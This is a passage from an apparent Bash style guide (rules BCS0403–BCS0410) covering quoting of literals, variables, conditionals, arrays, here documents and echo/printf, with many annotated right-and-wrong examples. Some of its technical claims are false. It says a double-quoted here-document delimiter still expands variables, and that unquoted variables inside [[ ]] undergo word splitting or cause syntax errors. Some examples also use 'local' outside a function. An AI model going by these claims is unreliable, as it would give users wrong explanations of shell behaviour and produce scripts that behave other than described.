**3. URLs and email addresses:**

```bash
# ✗ Wrong - unquoted (@ and : are special)
URL=https://example.com/path
EMAIL=user@domain.com

# ✓ Correct - must quote
URL='https://example.com/path'
EMAIL='user@domain.com'
```

**4. Version numbers:**

```bash
# Version with dots
VERSION=1.0.0           # ✓ Acceptable (only dots)
VERSION='1.0.0'         # ✓ Better

# Version with hyphen
VERSION=1.0.0-beta      # ✓ Acceptable (alphanumeric, dots, hyphen)
VERSION='1.0.0-beta'    # ✓ Better
```

**5. Paths:**

```bash
# Simple paths
PATH=/usr/local/bin     # ✓ Acceptable
PATH='/usr/local/bin'   # ✓ Better

# Paths with spaces - MUST quote
PATH='/Applications/My App.app'     # ✓ Correct
PATH=/Applications/My App.app       # ✗ Wrong!

# Path construction
CONFIG="$HOME/.config"  # ✓ Variable quoted
CONFIG=$HOME/.config    # ✗ Dangerous - quote the variable!
```

**6. File extensions:**

```bash
# Extensions
EXT=.txt                # ✓ Acceptable
EXT='.txt'              # ✓ Better

# Pattern matching extensions - MUST quote
[[ "$file" == *.txt ]]      # ✓ Glob pattern
[[ "$file" == '*.txt' ]]    # ✓ Literal match
```

**7. Environment detection:**

```bash
# OS detection
OS=Linux                # ✓ Acceptable
OS='Linux'              # ✓ Better

# Testing
[[ "$OS" == Linux ]]    # ✓ Acceptable
[[ "$OS" == 'Linux' ]]  # ✓ Better

# Multiple values
if [[ "$OS" == Linux || "$OS" == Darwin ]]; then
  echo 'Unix-like system'
fi
```

**Recommendation summary:**

**When unquoted is acceptable:**
- Single-word alphanumeric values: `value`, `INFO`, `true`, `42`
- Simple paths with no spaces: `/usr/local/bin`, `/etc/config`
- File extensions: `.txt`, `.log`
- Version numbers: `1.0.0`, `2.5.3-beta`

**When quotes are mandatory:**
- Any value with spaces: `'hello world'`
- Any value with special characters: `'admin@example.com'`, `'*.txt'`
- Empty strings: `''`
- Values with quotes or backslashes: `'don'\''t'`, `'C:\path'`

**Best practice:**
**Always quote everything except the most trivial cases.** When in doubt, quote it. The small reduction in visual noise from omitting quotes on one-word literals is not worth the mental overhead of deciding "should I quote this?" or the risk of bugs when values change.

**Summary:**

- **One-word literals** - alphanumeric, underscore, hyphen, dot, slash only
- **Acceptable unquoted** - in assignments and conditionals (simple cases)
- **Better to quote** - more defensive, prevents future bugs
- **Mandatory quoting** - spaces, special characters, wildcards, empty strings
- **Always quote variables** - `"$var"` not `$var`
- **Consistency matters** - pick quoted or unquoted, stick with it
- **Default to quoting** - when in doubt, quote everything
- **Team preference** - some teams forbid unquoted, others allow for simple cases

**Key principle:** The one-word literal exception exists to acknowledge common practice, not to recommend it. Unquoted literals are a source of subtle bugs when values change. The safest, most consistent approach is to quote everything. Use unquoted literals sparingly, only for the most trivial cases, and never for values that might change or contain special characters. When establishing team standards, consider requiring quotes everywhere - it eliminates an entire category of quoting decisions and makes scripts more robust.


---


**Rule: BCS0403**

### Strings with Variables

Use double quotes when the string contains variables that need expansion:

```bash
# Message functions with variables
die 1 "Unknown option '$1'"
error "'$compiler' not found"
info "Installing to $PREFIX/bin"
success "Processed $count files"

# Echo statements with variables
echo "$SCRIPT_NAME $VERSION"
echo "Binary: $BIN_DIR/mailheader"
echo "Completion: $COMPLETION_DIR/mail-tools"

# Multi-line messages with variables
info '[DRY-RUN] Would install:' \
     "  $BIN_DIR/mailheader" \
     "  $BIN_DIR/mailmessage" \
     "  $LIB_DIR/mailheader.so"
```


---


**Rule: BCS0404**

### Mixed Quoting

When a string contains both static text and variables, use double quotes with single quotes nested for literal protection:

```bash
# Protect literal quotes around variables
die 2 "Unknown option '$1'"              # Single quotes are literal
die 1 "'gcc' compiler not found."        # 'gcc' shows literally with quotes
warn "Cannot access '$file_path'"        # Path shown with quotes

# Complex messages
info "Would remove: '$old_file' → '$new_file'"
error "Permission denied for directory '$dir_path'"
```


---


**Rule: BCS0405**

### Command Substitution in Strings

Use double quotes when including command substitution:

```bash
# Command substitution requires double quotes
echo "Current time: $(date +%T)"
info "Found $(wc -l "$file") lines"
die 1 "Checksum failed: expected $expected, got $(sha256sum "$file")"

# Assign with command substitution
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')"
TIMESTAMP="$(date -Ins)"
```


---


**Rule: BCS0406**

### Variables in Conditionals

**Always quote variables in test expressions to prevent word splitting and glob expansion, even when the variable is guaranteed to contain a safe value. Variable quoting in conditionals is mandatory; static comparison values follow normal quoting rules (single quotes for literals, unquoted for one-word values).**

**Rationale:**

- **Word Splitting Protection**: Unquoted variables undergo word splitting, breaking multi-word values into separate tokens
- **Glob Expansion Safety**: Unquoted variables trigger pathname expansion if they contain wildcards (`*`, `?`, `[`)
- **Whitespace Handling**: Quoted variables preserve leading/trailing whitespace and internal spacing
- **Empty Value Safety**: Unquoted empty variables disappear entirely, causing syntax errors in conditionals
- **Consistent Behavior**: Quoting ensures predicable behavior regardless of variable content
- **Security**: Prevents injection attacks where malicious input could exploit word splitting

**Always quote variables:**

**1. File test operators:**

```bash
# File existence tests
[[ -f "$file" ]]         # ✓ Correct - variable quoted
[[ -f $file ]]           # ✗ Wrong - word splitting if $file has spaces

# Directory tests
[[ -d "$path" ]]         # ✓ Correct
[[ -d $path ]]           # ✗ Wrong

# Readable/writable tests
[[ -r "$config_file" ]]  # ✓ Correct
[[ -w "$log_file" ]]     # ✓ Correct

# All file test operators require quoting
[[ -e "$file" ]]         # Exists
[[ -s "$file" ]]         # Non-empty
[[ -x "$binary" ]]       # Executable
[[ -L "$link" ]]         # Symbolic link
```

**2. String comparisons:**

```bash
# Equality/inequality
[[ "$name" == "$expected" ]]    # ✓ Correct - both variables quoted
[[ "$name" != "$other" ]]       # ✓ Correct

# Pattern matching (variable quoted, pattern may be quoted or not)
[[ "$filename" == *.txt ]]      # ✓ Correct - pattern unquoted for globbing
[[ "$filename" == '*.txt' ]]    # ✓ Also correct - literal match (no globbing)

# String emptiness
[[ -n "$value" ]]               # ✓ Correct - non-empty test
[[ -z "$value" ]]               # ✓ Correct - empty test
```

**3. Integer comparisons (in [[ ]]):**

```bash
# Numeric comparisons
[[ "$count" -eq 0 ]]            # ✓ Correct - variable quoted
[[ "$count" -gt 10 ]]           # ✓ Correct
[[ "$age" -le 18 ]]             # ✓ Correct

# All numeric operators
[[ "$a" -eq "$b" ]]             # Equal
[[ "$a" -ne "$b" ]]             # Not equal
[[ "$a" -lt "$b" ]]             # Less than
[[ "$a" -le "$b" ]]             # Less than or equal
[[ "$a" -gt "$b" ]]             # Greater than
[[ "$a" -ge "$b" ]]             # Greater than or equal
```

**4. Logical operators:**

```bash
# AND
[[ -f "$file" && -r "$file" ]]  # ✓ Correct - both variables quoted

# OR
[[ -f "$file1" || -f "$file2" ]] # ✓ Correct

# NOT
[[ ! -f "$file" ]]               # ✓ Correct

# Complex conditions
[[ -f "$config" && -r "$config" && -s "$config" ]] # ✓ All quoted
```

**Static comparison values - quoting rules:**

**1. Single-word literals (can be unquoted):**

```bash
# One-word values - unquoted acceptable
[[ "$action" == start ]]        # ✓ Acceptable - one-word literal
[[ "$action" == stop ]]         # ✓ Acceptable

# But single quotes also correct
[[ "$action" == 'start' ]]      # ✓ Also correct - explicit literal
[[ "$action" == 'stop' ]]       # ✓ Also correct
```

**2. Multi-word literals (must use single quotes):**

```bash
# Multi-word values - single quotes required
[[ "$message" == 'hello world' ]]        # ✓ Correct
[[ "$message" == hello world ]]          # ✗ Wrong - syntax error

# Sentences/phrases
[[ "$status" == 'operation complete' ]]  # ✓ Correct
[[ "$error" == 'file not found' ]]       # ✓ Correct
```

**3. Values with special characters (must be quoted):**

```bash
# Special characters - single quotes required
[[ "$input" == 'user@domain.com' ]]      # ✓ Correct - contains @
[[ "$path" == '/usr/local/bin' ]]        # ✓ Correct - contains /
[[ "$pattern" == '*.txt' ]]              # ✓ Correct - literal asterisk

# Avoid double quotes for static literals
[[ "$path" == "/usr/local/bin" ]]        # ✗ Unnecessary - no variables
```

**Pattern matching in conditionals:**

**1. Glob patterns (right side unquoted for matching):**

```bash
# Glob pattern matching - right side unquoted
[[ "$filename" == *.txt ]]               # ✓ Matches any .txt file
[[ "$filename" == *.@(jpg|png) ]]        # ✓ Extended glob pattern
[[ "$filename" == data_[0-9]*.csv ]]     # ✓ Pattern with character class

# Quoting pattern makes it literal
[[ "$filename" == '*.txt' ]]             # ✓ Matches literal "*.txt" only
```

**2. Regex patterns (use =~ operator):**

```bash
# Regex matching - pattern unquoted or in variable
[[ "$email" =~ ^[a-z]+@[a-z]+\.[a-z]+$ ]]  # ✓ Regex pattern unquoted
[[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]] # ✓ Semver pattern

# Pattern in variable (must be unquoted variable)
pattern='^[0-9]{3}-[0-9]{4}$'
[[ "$phone" =~ $pattern ]]               # ✓ Correct - pattern variable unquoted
[[ "$phone" =~ "$pattern" ]]             # ✗ Wrong - treats as literal string
```

**Complete example with comprehensive quoting:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Validate file with proper quoting
validate_file() {
  local -- file="$1"
  local -- required_ext="$2"

  # File existence - variable quoted
  if [[ ! -f "$file" ]]; then
    error "File not found: $file"
    return 2
  fi

  # Readability - variable quoted
  if [[ ! -r "$file" ]]; then
    error "File not readable: $file"
    return 5
  fi

  # Non-empty - variable quoted
  if [[ ! -s "$file" ]]; then
    error "File is empty: $file"
    return 22
  fi

  # Extension check - pattern matching
  if [[ "$file" == *."$required_ext" ]]; then
    info "File has correct extension: .$required_ext"
  else
    error "File must have .$required_ext extension"
    return 22
  fi

  return 0
}

# Process configuration with string comparisons
process_config() {
  local -- config_file="$1"
  local -- line
  local -- key
  local -- value

  # Read configuration
  while IFS='=' read -r key value; do
    # Empty line check - variable quoted
    [[ -z "$key" ]] && continue

    # Comment line check - pattern matching
    [[ "$key" == \#* ]] && continue

    # String comparison - both sides quoted
    if [[ "$key" == 'timeout' ]]; then
      # Integer comparison - variable quoted
      if [[ "$value" -gt 0 ]]; then
        info "Timeout: $value seconds"
      else
        error "Timeout must be positive: $value"
        return 22
      fi
    elif [[ "$key" == 'mode' ]]; then
      # Multi-value comparison - static values single-quoted
      if [[ "$value" == 'production' || "$value" == 'development' ]]; then
        info "Mode: $value"
      else
        error "Invalid mode: $value (must be 'production' or 'development')"
        return 22
      fi
    fi
  done < "$config_file"
}

# Validate user input with comprehensive checks
validate_input() {
  local -- input="$1"
  local -- email_pattern='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

  # Empty check - variable quoted
  if [[ -z "$input" ]]; then
    error 'Input cannot be empty'
    return 22
  fi

  # Length check - string comparison
  if [[ "${#input}" -lt 3 ]]; then
    error "Input too short: minimum 3 characters"
    return 22
  fi

  # Pattern matching - glob
  if [[ "$input" == admin* ]]; then
    warn "Input starts with 'admin' - reserved prefix"
    return 1
  fi

  # Regex matching - pattern in variable
  if [[ "$input" =~ $email_pattern ]]; then
    info "Valid email format: $input"
  else
    error "Invalid email format: $input"
    return 22
  fi

  return 0
}

main() {
  local -- test_file='data.txt'
  local -- test_config='config.conf'
  local -- test_email='user@example.com'

  # Validate file
  if validate_file "$test_file" 'txt'; then
    success "File validation passed: $test_file"
  else
    die $? "File validation failed: $test_file"
  fi

  # Process configuration
  if [[ -f "$test_config" ]]; then
    process_config "$test_config"
  else
    warn "Config file not found: $test_config (using defaults)"
  fi

  # Validate input
  if validate_input "$test_email"; then
    success "Input validation passed: $test_email"
  else
    die $? "Input validation failed: $test_email"
  fi
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - unquoted variable in file test
[[ -f $file ]]
# If $file contains spaces, this becomes:
# [[ -f my file.txt ]]  # Syntax error!

# ✓ Correct - quoted variable
[[ -f "$file" ]]

# ✗ Wrong - unquoted variable with glob characters
file='*.txt'
[[ -f $file ]]  # Expands to all .txt files!

# ✓ Correct - quoted variable
[[ -f "$file" ]]  # Tests for literal "*.txt" file

# ✗ Wrong - unquoted empty variable
name=''
[[ -z $name ]]  # Becomes: [[ -z ]] - syntax error!

# ✓ Correct - quoted variable
[[ -z "$name" ]]  # Correctly tests for empty string

# ✗ Wrong - unquoted variable in string comparison
[[ $action == start ]]
# If $action has spaces: "start server"
# Becomes: [[ start server == start ]]  # Syntax error!

# ✓ Correct - quoted variable
[[ "$action" == start ]]

# ✗ Wrong - double quotes for static literal
[[ "$mode" == "production" ]]

# ✓ Correct - single quotes for static literal
[[ "$mode" == 'production' ]]

# Or unquoted for one-word literal
[[ "$mode" == production ]]

# ✗ Wrong - unquoted pattern variable in regex
pattern='^test'
[[ $input =~ "$pattern" ]]  # Wrong - double quotes make it literal

# ✓ Correct - unquoted pattern variable
pattern='^test'
[[ "$input" =~ $pattern ]]  # Correct - regex matching

# ✗ Wrong - inconsistent quoting
[[ -f $file && -r "$file" ]]  # Inconsistent!

# ✓ Correct - consistent quoting
[[ -f "$file" && -r "$file" ]]

# ✗ Wrong - unquoted integer variable
[[ $count -eq 0 ]]
# If $count is empty or has spaces, syntax error

# ✓ Correct - quoted integer variable
[[ "$count" -eq 0 ]]

# ✗ Wrong - multi-word literal unquoted
[[ "$message" == hello world ]]  # Syntax error

# ✓ Correct - multi-word literal in single quotes
[[ "$message" == 'hello world' ]]
```

**Edge cases and special scenarios:**

**1. Variables containing dashes:**

```bash
# Variable with leading dash
arg='-v'

# ✗ Wrong - unquoted could be interpreted as option
[[ $arg == '-v' ]]  # Might cause issues

# ✓ Correct - quoted protects against option interpretation
[[ "$arg" == '-v' ]]
```

**2. Null vs empty strings:**

```bash
# Unset variable
unset var

# ✓ Correct - safely tests unset variables
[[ -z "$var" ]]      # True (empty)
[[ -n "$var" ]]      # False (not empty)

# Works even with set -u (nounset)
[[ -z "${var:-}" ]]  # Safe with nounset
```

**3. Pattern matching with quotes:**

```bash
# Glob pattern matching
[[ "$file" == *.txt ]]       # ✓ Pattern matching (glob)
[[ "$file" == '*.txt' ]]     # ✓ Literal string match
[[ "$file" == "*.txt" ]]     # ✓ Literal string match (unnecessary double quotes)

# Know which behavior you want!
```

**4. Case-insensitive comparisons:**

```bash
# Use nocasematch for case-insensitive glob
shopt -s nocasematch

[[ "$input" == yes ]]        # Matches: yes, YES, Yes, YeS, etc.

shopt -u nocasematch
```

**5. Regex with special characters:**

```bash
# Regex pattern with backslashes
[[ "$version" =~ ^[0-9]+\.[0-9]+$ ]]  # ✓ Correct - literal regex

# Pattern in variable - no backslash escaping needed
pattern='^[0-9]+\.[0-9]+$'
[[ "$version" =~ $pattern ]]  # ✓ Correct
```

**Testing conditional quoting:**

```bash
# Test word splitting protection
test_word_splitting() {
  local -- file='my file.txt'

  # This should succeed with quoting
  [[ -f "$file" ]] || info "File not found (expected): $file"

  # Test glob protection
  local -- pattern='*.txt'
  [[ -f "$pattern" ]] || info "Pattern file not found (expected)"

  info 'Word splitting tests passed'
}

# Test empty variable handling
test_empty_variables() {
  local -- empty=''

  # Empty string tests
  [[ -z "$empty" ]] || die 1 'Empty test failed'
  [[ ! -n "$empty" ]] || die 1 'Non-empty test failed'

  info 'Empty variable tests passed'
}

# Test pattern matching
test_pattern_matching() {
  local -- filename='test.txt'

  # Glob pattern
  [[ "$filename" == *.txt ]] || die 1 'Glob pattern failed'

  # Literal pattern
  [[ "$filename" == '*.txt' ]] && die 1 'Literal pattern should not match'

  info 'Pattern matching tests passed'
}
```

**When old test [ ] is used (legacy code):**

```bash
# Old test command - MUST quote variables (no exceptions)
[ -f "$file" ]               # ✓ Correct
[ -f $file ]                 # ✗ Wrong - very dangerous!

# String comparisons - MUST quote
[ "$var" = "value" ]         # ✓ Correct (= not ==)
[ $var = value ]             # ✗ Wrong - will fail with spaces

# Modern [[ ]] is preferred - more forgiving but still quote
[[ -f "$file" ]]             # ✓ Correct (preferred)
```

**Summary:**

- **Always quote variables** in all conditional tests (`[[ ]]` or `[ ]`)
- **File tests**: Quote the variable: `[[ -f "$file" ]]`
- **String comparisons**: Quote variables, use single quotes for static literals: `[[ "$var" == 'value' ]]`
- **Integer comparisons**: Quote variables: `[[ "$count" -eq 0 ]]`
- **Pattern matching**: Quote variable, leave pattern unquoted for globbing: `[[ "$file" == *.txt ]]`
- **Regex matching**: Quote variable, leave pattern unquoted: `[[ "$input" =~ $pattern ]]`
- **Static literals**: Use single quotes for multi-word or special chars, can omit quotes for one-word literals
- **Consistency**: Quote all variables consistently throughout conditional
- **Safety**: Quoting prevents word splitting, glob expansion, and injection attacks

**Key principle:** Variable quoting in conditionals is not optional - it's mandatory. Every variable reference in a test expression should be quoted to ensure safe, predictable behavior. Static comparison values follow the normal quoting rules: single quotes for literals, but one-word values can be unquoted. When in doubt, quote everything.


---


**Rule: BCS0407**

### Array Expansions

**Always quote array expansions with double quotes to preserve element boundaries and prevent word splitting. Use `"${array[@]}"` for separate elements and `"${array[*]}"` for a single concatenated string. Proper array quoting is critical for handling elements containing spaces, newlines, or special characters.**

**Rationale:**

- **Element Preservation**: `"${array[@]}"` preserves each element as a separate word, regardless of content
- **Word Splitting Prevention**: Unquoted arrays undergo word splitting, breaking elements on whitespace
- **Glob Protection**: Unquoted arrays trigger pathname expansion on glob characters
- **Empty Element Handling**: Quoted arrays preserve empty elements; unquoted arrays lose them
- **Predictable Behavior**: Quoting ensures consistent behavior across different array contents
- **Safe Iteration**: Quoted `"${array[@]}"` is the only safe way to iterate over array elements

**Basic array expansion forms:**

**1. Expand all elements as separate words (`[@]`):**

```bash
# Create array
declare -a files=('file1.txt' 'file 2.txt' 'file3.txt')

# ✓ Correct - quoted expansion (3 elements)
for file in "${files[@]}"; do
  echo "$file"
done
# Output:
# file1.txt
# file 2.txt
# file3.txt

# ✗ Wrong - unquoted expansion (4 elements due to word splitting!)
for file in ${files[@]}; do
  echo "$file"
done
# Output:
# file1.txt
# file
# 2.txt
# file3.txt
```

**2. Expand all elements as single string (`[*]`):**

```bash
# Array of words
declare -a words=('hello' 'world' 'foo' 'bar')

# ✓ Correct - single space-separated string
combined="${words[*]}"
echo "$combined"  # Output: hello world foo bar

# With custom IFS
IFS=','
combined="${words[*]}"
echo "$combined"  # Output: hello,world,foo,bar
IFS=' '
```

**When to use [@] vs [*]:**

**Use `[@]` (expand to separate words):**

```bash
# 1. Iteration
for item in "${array[@]}"; do
  process "$item"
done

# 2. Passing to functions
my_function "${array[@]}"

# 3. Passing to commands
grep pattern "${files[@]}"

# 4. Building new arrays
new_array=("${old_array[@]}" "additional" "elements")

# 5. Copying arrays
copy=("${original[@]}")
```

**Use `[*]` (expand to single string):**

```bash
# 1. Concatenating for output
echo "Items: ${array[*]}"

# 2. Custom separator with IFS
IFS=','
csv="${array[*]}"  # Creates comma-separated values

# 3. String comparison
if [[ "${array[*]}" == "one two three" ]]; then

# 4. Logging multiple values
log "Processing: ${files[*]}"
```

**Complete array expansion examples:**

**1. Safe array iteration:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Process files with spaces in names
process_files() {
  local -a files=(
    'document 1.txt'
    'report (final).pdf'
    'data-2024.csv'
  )

  local -- file
  local -i count=0

  # ✓ Correct - quoted expansion
  for file in "${files[@]}"; do
    if [[ -f "$file" ]]; then
      info "Processing: $file"
      ((count+=1))
    else
      warn "File not found: $file"
    fi
  done

  info "Processed $count files"
}

# Pass array to function
process_items() {
  local -a items=("$@")  # Capture arguments as array
  local -- item

  info "Received ${#items[@]} items"

  for item in "${items[@]}"; do
    info "Item: $item"
  done
}

main() {
  declare -a my_items=('item one' 'item two' 'item three')

  # ✓ Correct - pass array elements as separate arguments
  process_items "${my_items[@]}"

  # Process files
  process_files
}

main "$@"

#fin
```

**2. Array with custom IFS:**

```bash
# Create CSV from array
create_csv() {
  local -a data=("$@")
  local -- csv

  # Save original IFS
  local -- old_ifs="$IFS"

  # Set custom separator
  IFS=','
  csv="${data[*]}"  # Uses IFS as separator

  # Restore IFS
  IFS="$old_ifs"

  echo "$csv"
}

# Usage
declare -a fields=('name' 'age' 'email')
csv_line=$(create_csv "${fields[@]}")
echo "$csv_line"  # Output: name,age,email
```

**3. Building arrays from arrays:**

```bash
# Combine multiple arrays
declare -a fruits=('apple' 'banana')
declare -a vegetables=('carrot' 'potato')
declare -a dairy=('milk' 'cheese')

# ✓ Correct - combine arrays
declare -a all_items=(
  "${fruits[@]}"
  "${vegetables[@]}"
  "${dairy[@]}"
)

echo "Total items: ${#all_items[@]}"  # Output: 6

# Add prefix to each element
declare -a files=('report.txt' 'data.csv')
declare -a prefixed=()

local -- file
for file in "${files[@]}"; do
  prefixed+=("/backup/$file")
done

# Result: /backup/report.txt, /backup/data.csv
```

**4. Array expansion in commands:**

```bash
# Pass array elements to command
declare -a search_paths=(
  '/usr/local/bin'
  '/usr/bin'
  '/opt/custom/bin'
)

# ✓ Correct - each path is separate argument
find "${search_paths[@]}" -type f -name 'myapp'

# Grep multiple patterns
declare -a patterns=('error' 'warning' 'critical')

# ✓ Correct - each pattern as separate -e argument
local -- pattern
local -a grep_args=()
for pattern in "${patterns[@]}"; do
  grep_args+=(-e "$pattern")
done

grep "${grep_args[@]}" logfile.txt
```

**5. Conditional array checks:**

```bash
# Check if array contains value
array_contains() {
  local -- needle="$1"
  shift
  local -a haystack=("$@")
  local -- item

  for item in "${haystack[@]}"; do
    [[ "$item" == "$needle" ]] && return 0
  done

  return 1
}

declare -a allowed_users=('alice' 'bob' 'charlie')

if array_contains 'bob' "${allowed_users[@]}"; then
  info 'User authorized'
else
  error 'User not authorized'
fi
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - unquoted [@] expansion
declare -a files=('file 1.txt' 'file 2.txt')
for file in ${files[@]}; do
  echo "$file"
done
# Splits on spaces: 'file', '1.txt', 'file', '2.txt'

# ✓ Correct - quoted expansion
for file in "${files[@]}"; do
  echo "$file"
done
# Preserves: 'file 1.txt', 'file 2.txt'

# ✗ Wrong - unquoted [*] expansion
declare -a items=('one' 'two' 'three')
combined=${items[*]}  # Unquoted

# ✓ Correct - quoted expansion
combined="${items[*]}"

# ✗ Wrong - using [@] without quotes in assignment
declare -a source=('a' 'b' 'c')
copy=(${source[@]})  # Wrong - word splitting!

# ✓ Correct - quoted expansion
copy=("${source[@]}")

# ✗ Wrong - unquoted array in function call
my_function ${array[@]}  # Word splitting on each element

# ✓ Correct - quoted expansion
my_function "${array[@]}"

# ✗ Wrong - using [*] for iteration
for item in "${array[*]}"; do  # Single iteration with all elements!
  echo "$item"
done

# ✓ Correct - using [@] for iteration
for item in "${array[@]}"; do  # Separate iteration per element
  echo "$item"
done

# ✗ Wrong - unquoted array with glob characters
declare -a patterns=('*.txt' '*.md')
for pattern in ${patterns[@]}; do
  # Glob expansion happens - wrong!
  echo "$pattern"
done

# ✓ Correct - quoted to preserve literal values
for pattern in "${patterns[@]}"; do
  echo "$pattern"
done

# ✗ Wrong - using [@] for string concatenation
declare -a words=('hello' 'world')
sentence="${words[@]}"  # Results in "hello world" but fragile

# ✓ Correct - using [*] for concatenation
sentence="${words[*]}"  # Explicitly concatenates

# ✗ Wrong - forgetting quotes in command substitution
result=$(echo ${array[@]})  # Word splitting in subshell

# ✓ Correct - quoted expansion
result=$(echo "${array[@]}")

# ✗ Wrong - partial quoting
for item in "${array[@]"; do  # Missing closing quote!

# ✓ Correct - properly quoted
for item in "${array[@]}"; do
```

**Edge cases and special scenarios:**

**1. Empty arrays:**

```bash
# Empty array
declare -a empty=()

# ✓ Correct - safe iteration (zero iterations)
for item in "${empty[@]}"; do
  echo "$item"  # Never executes
done

# Array count
echo "Count: ${#empty[@]}"  # Output: 0
```

**2. Arrays with empty elements:**

```bash
# Array with empty string
declare -a mixed=('first' '' 'third')

# ✓ Quoted - preserves empty element (3 iterations)
for item in "${mixed[@]}"; do
  echo "Item: [$item]"
done
# Output:
# Item: [first]
# Item: []
# Item: [third]

# ✗ Unquoted - loses empty element (2 iterations)
for item in ${mixed[@]}; do
  echo "Item: [$item]"
done
# Output:
# Item: [first]
# Item: [third]
```

**3. Arrays with newlines:**

```bash
# Array with newline in element
declare -a data=(
  'line one'
  $'line two\nline three'
  'line four'
)

# ✓ Quoted - preserves newline
for item in "${data[@]}"; do
  echo "Item: $item"
  echo "---"
done
```

**4. Associative arrays:**

```bash
# Associative array
declare -A config=(
  [name]='myapp'
  [version]='1.0.0'
)

# ✓ Correct - iterate over keys
for key in "${!config[@]}"; do
  echo "$key = ${config[$key]}"
done

# ✓ Correct - iterate over values
for value in "${config[@]}"; do
  echo "Value: $value"
done
```

**5. Array slicing:**

```bash
# Array slicing
declare -a numbers=(0 1 2 3 4 5 6 7 8 9)

# ✓ Correct - quoted slice
subset=("${numbers[@]:2:4}")  # Elements 2-5
echo "${subset[@]}"  # Output: 2 3 4 5

# All elements from index 5
tail=("${numbers[@]:5}")
echo "${tail[@]}"  # Output: 5 6 7 8 9
```

**6. Parameter expansion with arrays:**

```bash
# Modify array elements
declare -a paths=('/usr/bin' '/usr/local/bin')

# Remove prefix from all elements
declare -a basenames=("${paths[@]##*/}")
echo "${basenames[@]}"  # Output: bin bin

# Add suffix to all elements
declare -a configs=('app' 'db' 'cache')
declare -a config_files=("${configs[@]/%/.conf}")
echo "${config_files[@]}"  # Output: app.conf db.conf cache.conf
```

**Testing array expansions:**

```bash
# Test word splitting behavior
test_word_splitting() {
  local -a test_array=('one two' 'three')

  # Count with quoted expansion
  local -a quoted=("${test_array[@]}")
  local -i quoted_count="${#quoted[@]}"

  # Count with unquoted expansion (DON'T DO THIS - just for testing)
  set -f  # Disable globbing for test
  local -a unquoted=(${test_array[@]})
  local -i unquoted_count="${#unquoted[@]}"
  set +f

  echo "Quoted count: $quoted_count"    # Output: 2
  echo "Unquoted count: $unquoted_count" # Output: 3

  [[ $quoted_count -eq 2 ]] || die 1 'Quoted expansion failed'
  info 'Array expansion test passed'
}

# Test empty element preservation
test_empty_elements() {
  local -a with_empty=('first' '' 'third')

  local -i count=0
  local -- item

  for item in "${with_empty[@]}"; do
    ((count+=1))
  done

  [[ $count -eq 3 ]] || die 1 'Empty element not preserved'
  info 'Empty element test passed'
}
```

**When to use different expansion forms:**

```bash
# [@] - Separate elements (most common)
# Use for:
# - Function arguments: func "${array[@]}"
# - Command arguments: cmd "${array[@]}"
# - Iteration: for item in "${array[@]}"
# - Array copying: copy=("${array[@]}")

# [*] - Single string (less common)
# Use for:
# - Display: echo "Items: ${array[*]}"
# - Logging: log "Values: ${array[*]}"
# - CSV with IFS: IFS=','; csv="${array[*]}"
# - String comparison: [[ "${array[*]}" == "a b c" ]]

# Individual element access (no quotes needed for single element)
echo "${array[0]}"     # First element
echo "${array[-1]}"    # Last element (Bash 4.3+)
echo "${array[index]}" # Specific index

# Array length (no quotes needed)
echo "${#array[@]}"    # Number of elements
```

**Summary:**

- **Always quote array expansions**: `"${array[@]}"` or `"${array[*]}"`
- **Use `[@]`** for separate elements (iteration, function args, commands)
- **Use `[*]`** for single concatenated string (display, logging, CSV)
- **Quoted `[@]`** is the only safe iteration form
- **Unquoted arrays** undergo word splitting and glob expansion (dangerous!)
- **Empty elements** are preserved only with quoted expansion
- **Consistent quoting** prevents subtle bugs with spaces, newlines, or special chars
- **Element boundaries** are maintained only when properly quoted

**Key principle:** Array expansion quoting is non-negotiable. The form `"${array[@]}"` is the standard, safe way to expand arrays. Any deviation from quoted expansion introduces word splitting and glob expansion bugs. When you need a single string, explicitly use `"${array[*]}"`. When iterating or passing to functions/commands, always use `"${array[@]}"`.


---


**Rule: BCS0408**

### Here Documents

Use appropriate quoting for here documents based on whether expansion is needed:

\`\`\`bash
# No expansion - single quotes on delimiter
cat <<'EOF'
This text is literal.
$VAR is not expanded.
$(command) is not executed.
EOF

# With expansion - no quotes on delimiter
cat <<EOF
Script: $SCRIPT_NAME
Version: $VERSION
Time: $(date)
EOF

# With expansion - double quotes on delimiter (same as no quotes)
cat <<"EOF"     # Note: double quotes same as no quotes for here docs
Script: $SCRIPT_NAME
EOF
\`\`\`


---


**Rule: BCS0409**

### Echo and Printf Statements

\`\`\`bash
# Static strings - single quotes
echo 'Installation complete'
printf '%s\n' 'Processing files'

# With variables - double quotes
echo "$SCRIPT_NAME $VERSION"
echo "Installing to $PREFIX/bin"
printf 'Found %d files in %s\n' "$count" "$dir"

# Mixed content
echo "  • Binary: $BIN_DIR/mailheader"
echo "  • Version: $VERSION (released $(date))"
\`\`\`


---


**Rule: BCS0410**

### Summary Reference

| Content Type | Quote Style | Example |
|--------------|-------------|---------|
| Static string | Single \`'...'\` | \`info 'Starting process'\` |
| One-word literal (assignment) | Optional quotes | \`VAR=value\` or \`VAR='value'\` |
| One-word literal (conditional) | Optional quotes | \`[[ $x == value ]]\` or \`[[ $x == 'value' ]]\` |
| String with variable | Double \`"..."\` | \`info "Processing $file"\` |
| Variable in string | Double \`"..."\` | \`echo "Count: $count"\` |
| Literal quotes in string | Double with nested single | \`die 1 "Unknown '$1'"\` |
| Command substitution | Double \`"..."\` | \`echo "Time: $(date)"\` |
| Variables in conditionals | Double \`"$var"\` | \`[[ -f "$file" ]]\` |
